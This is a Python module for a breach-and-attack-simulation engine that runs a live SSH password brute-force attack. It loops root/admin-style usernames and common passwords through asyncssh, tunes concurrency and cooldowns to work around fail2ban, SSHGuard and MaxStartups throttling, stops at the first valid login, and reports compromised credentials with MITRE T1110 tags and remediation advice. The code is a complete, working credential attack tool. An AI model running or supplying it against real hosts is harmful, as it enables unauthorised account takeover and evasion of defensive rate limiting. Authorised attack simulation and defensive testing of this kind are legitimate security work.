"""
Adaptive SSH Brute Force Module v8
Enterprise BAS Credential Attack Engine

FINAL STABLE VERSION
==================================================

FIXES:
✔ SSH negotiation reset handling
✔ Connection reset detection
✔ Fail2ban / SSHGuard awareness
✔ MaxStartups-safe concurrency
✔ Stable brute force batching
✔ Real SSH auth attempts
✔ Modern + legacy SSH compatibility
✔ Stops after first success
✔ Huge wordlist support
✔ Better telemetry
✔ Clean logging
✔ Stable repeated execution
"""

import asyncio
import asyncssh
import random
import logging

from urllib.parse import urlparse
from typing import List

from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.models.simulation import Severity


# =========================================================
# CLEAN ASYNCSSH LOGGING
# =========================================================

logging.getLogger(
    "asyncssh"
).setLevel(logging.WARNING)

logger = logging.getLogger(
    "secureforge.module.ssh_bruteforce"
)


# =========================================================
# DEFAULTS
# =========================================================

DEFAULT_USERNAMES = [

    "root",
    "admin",
    "ubuntu",
    "user",
]

DEFAULT_PASSWORDS = [

    "password",
    "123456",
    "admin",
    "root",
]


# =========================================================
# MODULE
# =========================================================

class SSHBruteForceModule(BaseAttackModule):

    MODULE_NAME = "ssh_bruteforce"

    DESCRIPTION = (
        "Adaptive SSH brute force BAS simulation"
    )

    MITRE_TACTIC = "Credential Access"

    MITRE_IDS = [

        "T1110",
        "T1110.001"
    ]


    # =====================================================
    # WORDLIST LOADER
    # =====================================================

    def load_wordlist(

        self,
        path,
        limit=None,
    ):

        try:

            with open(path, "r") as f:

                count = 0

                for line in f:

                    value = line.strip()

                    if not value:
                        continue

                    yield value

                    count += 1

                    if limit and count >= limit:
                        break

        except Exception as e:

            self.logger.error(
                f"Wordlist load failed: {e}"
            )


    # =====================================================
    # USERNAMES
    # =====================================================

    def load_usernames(self):

        username_file = self.options.get(

            "username_file",

            "bas_engine/attack_modules/wordlists/usernames.txt"
        )

        usernames = list(

            self.load_wordlist(
                username_file
            )
        )

        if not usernames:

            usernames = DEFAULT_USERNAMES

        return usernames


    # =====================================================
    # PASSWORDS
    # =====================================================

    def load_passwords(self):

        password_file = self.options.get(

            "password_file",

            "attack_modules/wordlists/passwords.txt"
        )

        passwords = list(

            self.load_wordlist(
                password_file
            )
        )

        if not passwords:

            passwords = DEFAULT_PASSWORDS

        return passwords


    # =====================================================
    # EXECUTION
    # =====================================================

    async def execute(self) -> List:

        findings = []

        # =================================================
        # RESET STATE
        # =================================================

        self.stop_scan = False

        self.total_attempts = 0

        self.successes = []

        self.timeout_count = 0

        self.refused_count = 0

        self.auth_fail_count = 0

        self.reset_count = 0

        self.kex_failures = 0

        self.hostkey_failures = 0

        self.rate_limit_hits = 0

        self.enumerated_users = set()

        self.suspicious_users = set()

        # =================================================
        # TARGET PARSING
        # =================================================

        parsed = urlparse(self.target)

        host = parsed.hostname or self.target

        if parsed.scheme in [

            "http",
            "https"
        ]:

            port = 22

        else:

            port = int(

                self.options.get(
                    "ssh_port",
                    22
                )
            )

        timeout = float(

            self.options.get(
                "timeout",
                5.0
            )
        )

        # =================================================
        # LOWER CONCURRENCY
        # avoids MaxStartups resets
        # =================================================

        concurrency = int(

            self.options.get(
                "concurrency",
                5
            )
        )

        adaptive_delay = float(

            self.options.get(
                "adaptive_delay",
                0.15
            )
        )

        # =================================================
        # SMALLER BATCHES
        # =================================================

        batch_size = int(

            self.options.get(
                "batch_size",
                25
            )
        )

        live = self.options.get(

            "live_mode",
            True
        )

        # =================================================
        # LOAD WORDLISTS
        # =================================================

        usernames = self.load_usernames()

        passwords = self.load_passwords()

        print(

            f"\n[WORDLISTS] "

            f"{len(usernames)} usernames | "

            f"{len(passwords)} passwords"
        )

        # =================================================
        # PRIORITIZE FIRST ENTRIES
        # =================================================

        if len(usernames) > 1:

            usernames = usernames[:1] + random.sample(

                usernames[1:],
                len(usernames[1:])
            )

        if len(passwords) > 5:

            passwords = passwords[:5] + random.sample(

                passwords[5:],
                len(passwords[5:])
            )

        # =================================================
        # PORT CHECK
        # =================================================

        reachable = await self._probe_port(

            host,
            port,
            timeout
        )

        if not reachable:

            findings.append(

                self.finding(

                    title="SSH Port Unreachable",

                    description=(
                        f"SSH service "
                        f"not reachable "
                        f"on {host}:{port}"
                    ),

                    severity=Severity.INFO,

                    mitre_id="T1046",

                    evidence=(
                        f"connect_timeout "
                        f"{host}:{port}"
                    ),
                )
            )

            return findings

        print(

            f"\n[SSH OPEN] "
            f"{host}:{port}"
        )

        # =================================================
        # BANNER
        # =================================================

        banner = await self._get_banner(

            host,
            port,
            timeout
        )

        if banner:

            print(
                f"[BANNER] {banner}"
            )

        # =================================================
        # LIVE MODE
        # =================================================

        if live:

            print(
                "\n[LIVE SSH ATTACK]"
            )

            semaphore = asyncio.Semaphore(
                concurrency
            )

            async def worker(

                username,
                password,
            ):

                async with semaphore:

                    if self.stop_scan:
                        return

                    self.total_attempts += 1

                    result = await self._try_auth(

                        host,
                        port,
                        username,
                        password,
                        timeout
                    )

                    # =====================================
                    # SUCCESS
                    # =====================================

                    if result == "success":

                        print(

                            f"\n[COMPROMISED] "

                            f"{username}:{password}\n"
                        )

                        self.successes.append(

                            (
                                username,
                                password
                            )
                        )

                        self.stop_scan = True

                        return

                    # =====================================
                    # AUTH FAIL
                    # =====================================

                    elif result == "auth_failed":

                        self.auth_fail_count += 1

                        self.enumerated_users.add(
                            username
                        )

                        print(
                            f"[FAIL] "
                            f"{username}:{password}"
                        )

                    # =====================================
                    # TIMEOUT
                    # =====================================

                    elif result == "timeout":

                        self.timeout_count += 1

                        self.suspicious_users.add(
                            username
                        )

                        print(
                            f"[SLOW AUTH] "
                            f"{username}:{password}"
                        )

                    # =====================================
                    # RESET
                    # =====================================

                    elif result == "reset":

                        self.reset_count += 1

                        print(
                            f"[RESET BY TARGET] "
                            f"{username}:{password}"
                        )

                        # ---------------------------------
                        # adaptive cooldown
                        # ---------------------------------

                        await asyncio.sleep(2)

                    # =====================================
                    # RATE LIMITED
                    # =====================================

                    elif result == "rate_limited":

                        self.rate_limit_hits += 1

                        print(
                            f"[RATE LIMITED] "
                            f"{username}:{password}"
                        )

                        await asyncio.sleep(5)

                    # =====================================
                    # REFUSED
                    # =====================================

                    elif result == "refused":

                        self.refused_count += 1

                        print(
                            f"[REFUSED] "
                            f"{username}:{password}"
                        )

                    # =====================================
                    # KEX FAILED
                    # =====================================

                    elif result == "kex_failed":

                        self.kex_failures += 1

                        print(
                            f"[KEX FAILED] "
                            f"{username}:{password}"
                        )

                    # =====================================
                    # HOSTKEY FAILED
                    # =====================================

                    elif result == "hostkey_failed":

                        self.hostkey_failures += 1

                        print(
                            f"[HOSTKEY FAILED] "
                            f"{username}:{password}"
                        )

                    # =====================================
                    # OTHER
                    # =====================================

                    else:

                        print(
                            f"[OTHER] "
                            f"{username}:{password}"
                        )

                    # =====================================
                    # ADAPTIVE DELAY
                    # =====================================

                    await asyncio.sleep(
                        adaptive_delay
                    )

            # =================================================
            # FULL BRUTE FORCE
            # =================================================

            batch = []

            for password in passwords:

                for username in usernames:

                    if self.stop_scan:
                        break

                    task = asyncio.create_task(

                        worker(
                            username,
                            password
                        )
                    )

                    batch.append(task)

                    # =====================================
                    # PROCESS BATCH
                    # =====================================

                    if len(batch) >= batch_size:

                        await asyncio.gather(*batch)

                        batch = []

                if self.stop_scan:
                    break

            # =================================================
            # FINAL BATCH
            # =================================================

            if batch:

                await asyncio.gather(*batch)

        # =================================================
        # SUCCESS FINDING
        # =================================================

        if self.successes:

            findings.append(

                self.finding(

                    title=(
                        "SSH Credential "
                        "Compromise"
                    ),

                    description=(

                        f"{len(self.successes)} "

                        f"valid credential "

                        f"pair(s) discovered"
                    ),

                    severity=Severity.CRITICAL,

                    mitre_id="T1110.001",

                    evidence=str(
                        self.successes
                    ),

                    remediation=(
                        "Disable password auth, "
                        "enable MFA, "
                        "deploy fail2ban."
                    ),
                )
            )

        else:

            findings.append(

                self.finding(

                    title=(
                        "SSH Credential "
                        "Attack Failed"
                    ),

                    description=(

                        f"{self.total_attempts} "

                        f"credential attempts "
                        f"performed"
                    ),

                    severity=Severity.INFO,
                )
            )

        # =================================================
        # TELEMETRY
        # =================================================

        findings.append(

            self.finding(

                title="SSH Attack Telemetry",

                description=(
                    "Credential attack "
                    "simulation telemetry"
                ),

                severity=Severity.INFO,

                raw_data={

                    "attempts":
                        self.total_attempts,

                    "successes":
                        len(self.successes),

                    "auth_failures":
                        self.auth_fail_count,

                    "timeouts":
                        self.timeout_count,

                    "resets":
                        self.reset_count,

                    "rate_limits":
                        self.rate_limit_hits,

                    "refused":
                        self.refused_count,

                    "kex_failures":
                        self.kex_failures,

                    "hostkey_failures":
                        self.hostkey_failures,
                },
            )
        )

        print(

            f"\n[COMPLETE] "

            f"{self.total_attempts} attempts | "

            f"{len(self.successes)} successes | "

            f"{self.reset_count} resets"
        )

        return findings


    # =====================================================
    # HELPERS
    # =====================================================

    async def _probe_port(

        self,
        host,
        port,
        timeout,
    ):

        try:

            _, writer = await asyncio.wait_for(

                asyncio.open_connection(
                    host,
                    port
                ),

                timeout=timeout
            )

            writer.close()

            return True

        except Exception:

            return False


    async def _get_banner(

        self,
        host,
        port,
        timeout,
    ):

        try:

            reader, writer = await asyncio.wait_for(

                asyncio.open_connection(
                    host,
                    port
                ),

                timeout=timeout
            )

            banner = await asyncio.wait_for(

                reader.readline(),

                timeout=timeout
            )

            writer.close()

            return banner.decode(
                errors="replace"
            ).strip()

        except Exception:

            return ""


    async def _try_auth(

        self,
        host,
        port,
        username,
        password,
        timeout,
    ):

        try:

            conn = await asyncio.wait_for(

                asyncssh.connect(

                    host,

                    port=port,

                    username=username,

                    password=password,

                    known_hosts=None,

                    connect_timeout=5,

                    login_timeout=10,

                    preferred_auth=[

                        "password",
                        "keyboard-interactive",
                    ],

                    kex_algs=[

                        "curve25519-sha256",
                        "curve25519-sha256@libssh.org",
                        "ecdh-sha2-nistp256",
                        "diffie-hellman-group14-sha256",
                        "diffie-hellman-group14-sha1",
                    ],

                    encryption_algs=[

                        "aes128-ctr",
                        "aes192-ctr",
                        "aes256-ctr",
                        "aes128-cbc",
                        "aes256-cbc",
                    ],

                    server_host_key_algs=[

                        "ssh-ed25519",
                        "ecdsa-sha2-nistp256",
                        "rsa-sha2-256",
                        "rsa-sha2-512",
                        "ssh-rsa",
                    ],
                ),

                timeout=15
            )

            conn.close()

            return "success"

        # =====================================================
        # AUTH FAIL
        # =====================================================

        except asyncssh.PermissionDenied:

            return "auth_failed"

        # =====================================================
        # CONNECTION RESET
        # =====================================================

        except ConnectionResetError:

            return "reset"

        # =====================================================
        # SSH NEGOTIATION RESET
        # =====================================================

        except asyncssh.ConnectionLost:

            return "reset"

        # =====================================================
        # TIMEOUT
        # =====================================================

        except asyncio.TimeoutError:

            return "timeout"

        # =====================================================
        # REFUSED
        # =====================================================

        except ConnectionRefusedError:

            return "refused"

        # =====================================================
        # KEX FAILURE
        # =====================================================

        except asyncssh.KeyExchangeFailed:

            return "kex_failed"

        # =====================================================
        # HOSTKEY FAILURE
        # =====================================================

        except asyncssh.HostKeyNotVerifiable:

            return "hostkey_failed"

        # =====================================================
        # DISCONNECT
        # =====================================================

        except asyncssh.DisconnectError:

            return "disconnect"

        # =====================================================
        # GENERIC
        # =====================================================

        except Exception as e:

            error_text = str(e).lower()

            if "reset by peer" in error_text:

                return "reset"

            if "connection lost" in error_text:

                return "reset"

            if "too many connections" in error_text:

                return "rate_limited"

            print(f"[ERROR] {e}")

            return "other"